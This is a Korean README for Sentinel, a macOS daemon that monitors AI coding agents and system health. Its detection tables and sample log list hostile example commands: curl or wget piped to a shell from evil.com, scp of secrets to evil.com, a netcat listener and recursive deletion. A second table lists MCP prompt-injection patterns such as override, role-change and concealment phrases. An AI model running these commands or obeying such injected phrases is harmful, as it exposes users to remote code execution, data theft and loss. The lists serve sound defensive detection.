<p align="center">
  <h1 align="center">Sentinel</h1>
  <p align="center">
    <strong>AI 에이전트를 위한 안전벨트.</strong>
  </p>
  <p align="center">
    AI가 내 컴퓨터에서 뭘 하는지 감시하고,<br/>
    위험한 행동이 감지되면 즉시 알려줍니다.
  </p>
  <p align="center">
    <a href="https://pypi.org/project/sentinel-mac/"><img src="https://img.shields.io/pypi/v/sentinel-mac" alt="PyPI"></a>
    <img src="https://img.shields.io/badge/platform-macOS-blue" alt="macOS">
    <img src="https://img.shields.io/badge/python-3.8+-green" alt="Python 3.8+">
    <img src="https://img.shields.io/badge/tests-190%20passed-brightgreen" alt="Tests">
    <img src="https://img.shields.io/badge/license-MIT-lightgrey" alt="MIT License">
    <br/>
    <a href="https://buymeacoffee.com/pmpt_cafe"><img src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-support-orange?logo=buy-me-a-coffee&logoColor=white" alt="Buy Me a Coffee"></a>
  </p>
</p>

**[English README](README.md)**

---

## Sentinel이 왜 필요한가?

Claude Code, Cursor, GPT 같은 AI 코딩 에이전트는 이제 혼자서 코드를 쓰고, 셸 명령어를 실행하고, 파일을 수정하고, 네트워크 요청까지 보냅니다. 강력하지만, 그만큼 위험합니다.

**잠깐 자리를 비운 사이 무슨 일이 생길 수 있을까?**

| 상황                               | 결과                                   |
| ---------------------------------- | -------------------------------------- |
| AI가 `curl ... \| sh` 실행         | 알 수 없는 스크립트가 내 맥에서 실행됨 |
| AI가 `~/.ssh/authorized_keys` 수정 | SSH 키가 탈취됨                        |
| AI가 알 수 없는 서버에 접속        | 데이터 유출 가능                       |
| AI가 `requests` 대신 `requets` 설치 | 타이포스쿼팅 패키지가 내 맥에서 실행됨 |
| 장시간 세션 중 배터리 방전         | 작업 손실, 세션 증발                   |
| CPU 과열로 쓰로틀링                | AI가 멈추고, 전력만 수 시간 낭비       |

**Sentinel은 모든 것을 감시하되, 정말 중요할 때만 알림을 보냅니다.**

백그라운드 데몬으로 실행되면서 시스템 상태와 AI 에이전트 행동을 동시에 모니터링합니다. 위험한 상황이 감지되면 맥 알림, 텔레그램, ntfy, Slack 등으로 즉시 알려줍니다.

---

## 빠른 시작

### 설치 (권장: git clone)

```bash
git clone https://github.com/raunplaymore/sentinel.git
cd sentinel
bash install.sh            # venv + 의존성 + launchd (로그인 시 자동 시작)
```

터미널을 재시작한 후:

```bash
sentinel start             # 백그라운드 서비스 시작
sentinel stop              # 서비스 중지
sentinel restart           # 서비스 재시작
sentinel status            # 실행 상태 확인 (PID 표시)
sentinel --once            # 시스템 스냅샷 (1회)
sentinel --report          # 오늘의 이벤트 요약
sentinel --report 7        # 최근 7일 이벤트 요약

# 필터링된 리포트 (v0.7+)
sentinel --report --since 7d --severity critical
sentinel --report --since 24h --source agent_log --type agent_command
sentinel --report --json --since 30d > events.json    # versioned envelope (ADR 0004)

sentinel logs              # 실시간 로그 보기
sentinel --test-notify     # 모든 채널에 테스트 알림 전송
sentinel --version         # 버전 확인
sentinel --help            # 전체 옵션
```

### 대안: pip 설치

```bash
python3 -m venv ~/.sentinel-venv
~/.sentinel-venv/bin/pip install sentinel-mac
~/.sentinel-venv/bin/sentinel --init-config
~/.sentinel-venv/bin/sentinel              # 포그라운드 실행
```

설치하면 macOS 기본 알림이 바로 동작합니다. 별도 앱 설치 불필요.

---

## 두 겹의 보호막

Sentinel은 두 개의 독립적인 모니터링 레이어로 구성됩니다.

### 레이어 1: 시스템 헬스 모니터

30초마다 시스템 리소스를 점검하고, 문제가 심각해지기 전에 감지합니다.

|   카테고리    | 감시 대상                     | 알림 조건                          |
| :-----------: | ----------------------------- | ---------------------------------- |
|  **배터리**   | 잔량, 충전 상태, 소모율 (%/h) | 20% 이하, 급격한 소모              |
|   **온도**    | CPU 온도, 쓰로틀링 상태       | 85도 이상, 쓰로틀링 감지           |
|  **메모리**   | 사용률, AI 프로세스 메모리    | 90% 이상                           |
|  **디스크**   | 사용률, 남은 공간             | 90% 이상                           |
|  **AI 세션**  | 프로세스 감지, 실행 시간      | 3시간+ 연속 실행, 무한루프 의심    |
| **네트워크**  | 전송량                        | 100MB 이상 스파이크                |
| **야간 감시** | 심야 세션 + 배터리 상태       | 00~06시, 충전기 미연결, AI 실행 중 |
| **보안 설정** | 방화벽, Gatekeeper, FileVault | 하나라도 비활성화                  |

### 레이어 2: AI 보안 모니터

AI 에이전트가 내 맥에서 **실제로 하는 행동**을 실시간 감시합니다.

#### 파일 시스템 감시 (FSWatcher)

macOS FSEvents를 이용해 파일 변경을 감시하고, 어떤 프로세스가 변경했는지 추적합니다.

- **민감 파일 접근 감지**: `~/.ssh`, `.env`, `~/.config`, `~/.zshrc`, `~/.gitconfig` 등
- **프로세스 추적**: `lsof` 기반 프로세스 식별 + 부모 디렉토리 fallback
- **실행 파일 생성 감지**: `.sh`, `.command` 등 실행 가능한 파일 생성 시 알림
- **대량 파일 변경 감지**: 30초 내 50개 이상 파일 변경 시, 포렌식 컨텍스트와 함께 기록:
  - 프로젝트명 자동 감지 (`.git`, `package.json` 등으로 판별)
  - 의심 프로세스 식별 (`lsof`로 해당 디렉토리를 점유한 프로세스 탐지)
  - 영향받은 디렉토리 목록

**포렌식 로그 예시:**

```json
{
  "event_type": "bulk_change",
  "target": "1960 files in 30s",
  "detail": {
    "count": 1960,
    "project": "my-favorite-squad",
    "suspect_process": "node",
    "suspect_pid": 12345,
    "top_directories": ["/Users/dev/my-favorite-squad/.next"]
  }
}
```

기존에는 "1960개 파일이 변경됨"이 전부였지만, 이제는 **"my-favorite-squad 프로젝트에서 node(Next.js 빌드)가 실행됨"** 이라고 바로 판단할 수 있습니다.

#### 네트워크 연결 추적 (NetTracker)

AI 프로세스의 모든 외부 네트워크 연결을 추적합니다.

- 안전한 호스트 허용 목록 (Anthropic API, GitHub, PyPI, npm 등)
- 역방향 DNS 조회 + 캐싱
- 허용 목록에 없는 호스트 접속 시 warning, 비표준 포트까지 사용하면 critical
- 중복 연결 자동 제거 (5분 TTL)

#### 에이전트 로그 파서 (AgentLogParser)

Claude Code 세션 로그를 실시간으로 파싱해서, 위험한 명령어가 실행되기 전에 감지합니다.

**11가지 고위험 명령어 패턴 감지:**

| 패턴                   | 위험 유형         | 예시                                |
| ---------------------- | ----------------- | ----------------------------------- |
| `curl ... \| sh`       | 파이프 → 셸 실행  | `curl http://evil.com/script \| sh` |
| `wget ... \| bash`     | 파이프 → 셸 실행  | `wget http://x/s \| bash`           |
| `chmod +x`             | 실행 권한 부여    | `chmod +x /tmp/backdoor`            |
| `ssh`                  | SSH 접속          | `ssh root@evil.com`                 |
| `rm -rf ~/` 또는 `/`   | 위험한 삭제       | `rm -rf ~/important-project`        |
| `base64 -d`            | 인코딩된 페이로드 | `base64 -d payload.b64 \| sh`       |
| `nc -l`                | 네트캣 리스너     | `nc -l 4444`                        |
| `pip install <패키지>` | 임의 패키지 설치  | `pip install evil-pkg`              |
| `npm install <패키지>` | 임의 패키지 설치  | `npm install malicious-lib`         |
| `scp`                  | 파일 전송         | `scp secrets.txt evil.com:`         |
| `eval(`                | 동적 eval         | `eval(base64_decode(...))`          |

#### 타이포스쿼팅 감지

AI 에이전트는 때때로 존재하지 않는 패키지를 설치하려 합니다 — hallucination이나 한 글자 오타 때문입니다. 공격자들은 이 점을 노려 인기 패키지 이름에서 한 글자만 다른 패키지를 미리 배포해둡니다.

Sentinel은 모든 `pip install`, `npm install` 명령에서 패키지명을 추출하고, PyPI 상위 ~300개 + npm 상위 ~200개 목록과 [Levenshtein 편집 거리](https://ko.wikipedia.org/wiki/%EB%A0%88%EB%B2%88%EC%8A%88%ED%83%80%EC%9D%B8_%EA%B1%B0%EB%A6%AC)로 비교합니다. 오타처럼 보이면 코드가 실행되기 전에 즉시 알림을 보냅니다.

```
AI 실행: pip install requets
Sentinel: 🚨 타이포스쿼팅 의심 — 'requets'는 'requests'와 유사 (편집 거리 1)

AI 실행: npm install lodashs
Sentinel: 🚨 타이포스쿼팅 의심 — 'lodashs'는 'lodash'와 유사 (편집 거리 1)

AI 실행: pip install numpyy pandas
Sentinel: 🚨 타이포스쿼팅 의심 — 'numpyy'는 'numpy'와 유사 (편집 거리 1)
          ✅ 'pandas' — 정상
```

| 편집 거리 | 신뢰도 | 알림 등급 |
| :-------: | ------ | --------- |
| 1         | 높음   | Critical  |
| 2         | 중간   | Warning   |

패키지 목록은 Sentinel 릴리즈마다 갱신됩니다. 타이포스쿼팅 공격의 주요 타깃인 상위 패키지들을 커버하며, 오탐률을 최소화하기 위해 긴 꼬리의 비인기 패키지는 의도적으로 제외합니다.

#### MCP 인젝션 감지

MCP 서버 응답에 포함된 프롬프트 인젝션 시도를 실시간으로 스캔합니다.

| 패턴                 | 위험 유형                   |
| -------------------- | --------------------------- |
| 시스템 태그 주입     | 응답에 `<system>` 태그 삽입 |
| 지시 우회            | "이전 지시를 무시하라"      |
| 역할 탈취            | "너는 이제..."              |
| 은닉 시도            | "유저에게 말하지 마"        |
| HTML/스크립트 주입   | `<script>`, `<img>` 태그    |
| 긴급성 조작          | "중요: 무시하라..."         |
| 토큰 경계 공격       | `<\|im_start\|>` 마커       |
| 가짜 시스템 프롬프트 | "system prompt: ..."        |

#### 커스텀 룰 (고급)

`config.yaml`에 정규식 기반 탐지 규칙을 직접 정의할 수 있습니다.

```yaml
security:
  custom_rules:
    - name: "AWS 자격증명 접근"
      pattern: "\\.aws/credentials"
      source: fs_watcher # fs_watcher, agent_log, net_tracker, 또는 "all"
      level: critical # critical, warning, 또는 info

    - name: "Docker 소켓 마운트"
      pattern: "docker.*-v.*/var/run/docker\\.sock"
      source: agent_log
      level: critical

    - name: "크립토 마이너"
      pattern: "xmrig|cryptonight|stratum\\+tcp"
      source: all
      level: critical
```

---

## AI 프로세스 감지

Sentinel은 오탐을 방지하기 위해 3단계 전략으로 AI 프로세스를 식별합니다.

| 단계  | 방법                                        | 예시                                        |
| :---: | ------------------------------------------- | ------------------------------------------- |
| **1** | 알려진 프로세스 이름                        | `ollama`, `llamaserver`, `mlx_lm`, `claude` |
| **2** | 일반 프로세스 + 커맨드라인에 AI 키워드 포함 | `python3` + args에 `transformers` 포함      |
| **3** | 모든 프로세스 커맨드라인의 AI 키워드 탐색   | `langchain`, `torch`, `openai`              |

이 방식 덕분에 일반 `node`나 `python3` 프로세스가 AI 전용 알림을 오발하지 않습니다.

---

## 알림 등급

Sentinel의 핵심 원칙: **모든 것을 감시하되, 알림은 최소한으로.**

알림이 너무 많으면 유저가 도구를 꺼버립니다. 그게 보안 도구의 가장 큰 적입니다.

|     등급     |        알림 발송        |   로깅    | 언제                                                          |
| :----------: | :---------------------: | :-------: | ------------------------------------------------------------- |
| **Critical** | O (macOS 알림 + 사운드) | O (JSONL) | SSH 키 접근, 파이프→셸, 미등록 호스트+비표준 포트, MCP 인젝션 |
| **Warning**  |       X (로그만)        | O (JSONL) | 민감 파일 접근, 미등록 호스트, 실행 파일 생성, 대량 변경      |
|   **Info**   |       X (로그만)        | O (JSONL) | AI 파일 활동, URL 조회, 비표준 포트 (등록 호스트)             |

모든 이벤트는 알림 여부와 무관하게 `~/.local/share/sentinel/events/YYYY-MM-DD.jsonl`에 기록됩니다.

---

## 이벤트 감사 로그

모든 보안 이벤트는 일별 JSONL 파일로 기록됩니다.

```
~/.local/share/sentinel/events/
├── 2026-03-17.jsonl
├── 2026-03-16.jsonl
└── ...
```

각 줄은 JSON 오브젝트입니다:

```json
{"ts":"2026-03-17T14:32:10","source":"fs_watcher","actor_pid":1234,"actor_name":"claude","event_type":"file_modify","target":"~/.zshrc","detail":{"sensitive":true,"ai_process":true},"risk_score":0.9}
{"ts":"2026-03-17T14:32:15","source":"net_tracker","actor_pid":5678,"actor_name":"node","event_type":"net_connect","target":"unknown-host.ru:443","detail":{"allowed":false},"risk_score":0.7}
{"ts":"2026-03-17T14:33:01","source":"agent_log","actor_pid":0,"actor_name":"claude_code","event_type":"agent_command","target":"curl http://evil.com | sh","detail":{"tool":"Bash","high_risk":true,"risk_reason":"pipe to shell"},"risk_score":0.9}
{"ts":"2026-03-17T14:34:00","source":"fs_watcher","actor_pid":9012,"actor_name":"node","event_type":"bulk_change","target":"1960 files in 30s","detail":{"count":1960,"project":"my-app","suspect_process":"node","suspect_pid":9012,"top_directories":["/Users/dev/my-app/.next"]},"risk_score":0}
```

로그는 **90일 후 자동 삭제**됩니다.

---

## 프라이버시 & 데이터

Sentinel은 **기본적으로 모든 것을 로컬에 보관합니다.** 무엇을 감시하고, 무엇을 디스크에 쓰며, 어디로 보내는지 아래에 모두 정리해 두었습니다.

### Sentinel이 감시하는 대상

기본 설정에서 파일 시스템 와처(FSWatcher)는 **홈 디렉토리**(`~`)에서 AI 프로세스가 일으킨 변경을 감시합니다. 예제 설정의 `watch_paths`에는 다음 경로가 포함됩니다.

- `~/.ssh`, `~/.env`, `~/.config`, `~/.zshrc`, `~/.bash_profile`, `~/.gitconfig`, `~/.aws` — 민감한 자격 증명 위치 (`sensitive_paths`에도 동일하게 등록되어 있음)
- `~/Desktop`, `~/Documents`, `~/Downloads` — AI 에이전트가 자주 파일을 만드는 작업 디렉토리

특정 경로를 감시 대상에서 제외하고 싶다면 `config.yaml`의 `watch_paths`와 `sensitive_paths`를 직접 수정하세요. 와처는 AI 프로세스(ollama, claude, AI 라이브러리를 쓰는 python 등)에 귀속된 변경에만 반응하며, 그 외 활동은 로그하지 않습니다.

### Sentinel이 디스크에 쓰는 데이터

| 위치 | 용도 | 보존 기간 |
|---|---|---|
| `~/.local/share/sentinel/events/YYYY-MM-DD.jsonl` | 일별 보안 이벤트 감사 로그 | 90일 후 자동 삭제 |
| `~/.local/share/sentinel/sentinel.lock` | 단일 인스턴스 락 파일 | 데몬 실행 중에만 |
| `~/.config/sentinel/config.yaml` | 사용자 설정 (직접 생성) | 직접 삭제할 때까지 |
| `~/.local/share/sentinel/host_context.jsonl` | (v0.6+, 옵트인) 컨텍스트 인식 탐지를 위한 빈도 카운터. `security.context_aware.enabled: true`일 때만 생성. 상위 디렉토리 권한 `0o700`, 파일 권한 `0o600`. | 30일 슬라이딩 학습 윈도 |

이벤트 로그에는 접속한 호스트명, AI 프로세스가 건드린 파일 경로, AI 에이전트가 실행한 Bash 명령이 들어갑니다. **파일 내용 자체는 저장하지 않습니다.**

### 외부로 나가는 데이터

**없습니다.** 사용자가 명시적으로 옵트인한 경우에만 외부로 나갑니다. Sentinel은 자체 텔레메트리를 일절 보내지 않으며, 네트워크 트래픽은 사용자가 직접 설정한 알림 채널에 한해서만 발생합니다.

- ntfy.sh — 알림 제목/본문을 사용자 토픽으로 전송 (`ntfy_topic` 설정 시)
- Slack — 사용자 웹훅으로 알림 전송 (`slack_webhook` 설정 시)
- Telegram — 사용자 봇/채팅으로 알림 전송 (`telegram_bot_token` + `telegram_chat_id` 설정 시)

macOS 기본 알림은 외부로 나가지 않고 머신 안에서 동작합니다.

### 로컬 로깅 끄기

이벤트 로그 쓰기를 멈추고 싶다면 설정 파일에서 `security.enabled: false`로 두세요. 데몬은 계속 실행되며 시스템 헬스 체크는 동작하지만, 보안 레이어(FSWatcher / NetTracker / AgentLogParser)는 완전히 꺼집니다.

---

## 알림 채널

macOS 기본 알림은 설치 즉시 동작합니다. 나머지는 선택사항입니다.

```yaml
notifications:
  macos: true                  # 기본값. 설정 불필요.
  ntfy_topic: "my-topic"       # 값 설정 → ntfy.sh 활성화
  ntfy_server: "https://ntfy.sh"
  slack_webhook: "https://hooks.slack.com/..."  # URL 설정 → Slack 활성화
  telegram_bot_token: "123:ABC..."              # 토큰 설정 → 텔레그램 활성화
  telegram_chat_id: "456789"
```

**설계 원칙:** 값이 있으면 활성화. 별도의 on/off 스위치 없음.

| 채널           |      설정 필요      | 추천 용도                  |
| -------------- | :-----------------: | -------------------------- |
| **macOS 기본** |        없음         | 책상 앞에서 작업할 때      |
| **ntfy.sh**    | 앱 설치 + 토픽 설정 | 자리 비울 때 폰 알림       |
| **Slack**      |    웹훅 URL 생성    | 팀 공유                    |
| **Telegram**   |  봇 생성 + 채팅 ID  | 폰 알림 (텔레그램 선호 시) |

---

## 안정성

- **로그 로테이션** — 일별 JSONL 파일, 90일 후 자동 삭제
- **중복 실행 방지** — 글로벌 파일 락 (`~/.local/share/sentinel/sentinel.lock`) + launchd 사전 체크로, 어디서 실행하든 중복 인스턴스 차단
- **알림 재시도** — ntfy.sh 네트워크 실패 시 최대 3회 재시도
- **설정 폴백** — 설정 파일 오류 시 안전한 기본값으로 자동 전환
- **정상 종료** — SIGTERM/SIGINT 시 락 파일 정리
- **자동 재시작** — launchd KeepAlive로 크래시 시 자동 복구
- **컬렉터 격리** — 보안 컬렉터가 각각 독립 실행, 하나가 죽어도 나머지 정상 동작
- **명시적 실패** — 로그 디렉토리 미존재 시 WARNING 로그 출력 (무음 실패 방지)

---

## 아키텍처

```
sentinel_mac/
├── core.py                  # 데몬, 설정, CLI
├── models.py                # SystemMetrics, Alert, SecurityEvent
├── engine.py                # AlertEngine (시스템 + 보안 이벤트 평가)
├── notifier.py              # NotificationManager (macOS, ntfy, Slack, Telegram)
├── event_logger.py          # JSONL 감사 로거 (일별 로테이션)
└── collectors/
    ├── system.py            # MacOSCollector (psutil + 네이티브 명령어)
    ├── fs_watcher.py        # FSWatcher (watchdog + lsof)
    ├── net_tracker.py       # NetTracker (psutil.net_connections + DNS)
    └── agent_log_parser.py  # AgentLogParser (Claude Code JSONL 파서)
```

**실행 흐름:**

```
메인 스레드 (30초 주기):
  MacOSCollector ──→ AlertEngine ──→ NotificationManager
  NetTracker.poll() ──→ SecurityEvent ──→ 큐

백그라운드 스레드:
  FSWatcher (watchdog) ──→ SecurityEvent ──→ 큐
  AgentLogParser (3초 폴링) ──→ SecurityEvent ──→ 큐

큐 처리 (30초 주기):
  큐 ──→ EventLogger (JSONL) ──→ AlertEngine ──→ NotificationManager
```

모든 보안 이벤트는 스레드 안전한 `queue.Queue`를 통해 전달됩니다. 메인 루프가 매 사이클마다 최대 100개 이벤트를 처리하고, 알림 발송 여부와 무관하게 모든 이벤트를 JSONL에 기록합니다.

---

## 요구사항

- macOS 10.15+ (Catalina 이상)
- Python 3.8+

의존성 (자동 설치):

| 패키지     | 용도                                        |
| ---------- | ------------------------------------------- |
| `psutil`   | 시스템 메트릭, 네트워크 연결, 프로세스 정보 |
| `pyyaml`   | 설정 파싱                                   |
| `requests` | ntfy.sh, Slack, Telegram HTTP 전송          |
| `watchdog` | macOS FSEvents 파일 시스템 모니터링         |

### 선택 설치

```bash
brew install terminal-notifier   # 안정적인 macOS 알림 (macOS 15+ 권장)
brew install osx-cpu-temp        # 정확한 CPU 온도 측정
```

`terminal-notifier` 없으면 `osascript`로 폴백 (macOS Sequoia에서는 알림이 안 뜰 수 있음).
`osx-cpu-temp` 없으면 thermal pressure 상태로 대체.

---

## 삭제

```bash
bash uninstall.sh
```

서비스 중지, 가상환경/로그 삭제. 소스 코드와 설정 파일은 보존됩니다.

완전 삭제: `rm -rf sentinel/`

---

## AI와 함께 만들었습니다

Sentinel은 바이브 코딩으로 만들어졌습니다. 모든 설계 결정, 구현, 디버깅 과정이 [pmpt-cli](https://pmptwiki.com)로 기록되었습니다.

[Sentinel 프로젝트 페이지](https://pmptwiki.com/p/sentinel/)에서 v0.1.0부터 현재까지의 전체 개발 히스토리를 확인할 수 있습니다.

---

## 후원

Sentinel이 세션을 (또는 SSH 키를) 지켜줬다면, 커피 한 잔 사주세요!

<a href="https://buymeacoffee.com/pmpt_cafe">
  <img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=pmpt_cafe&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" />
</a>

---

## 라이선스

MIT
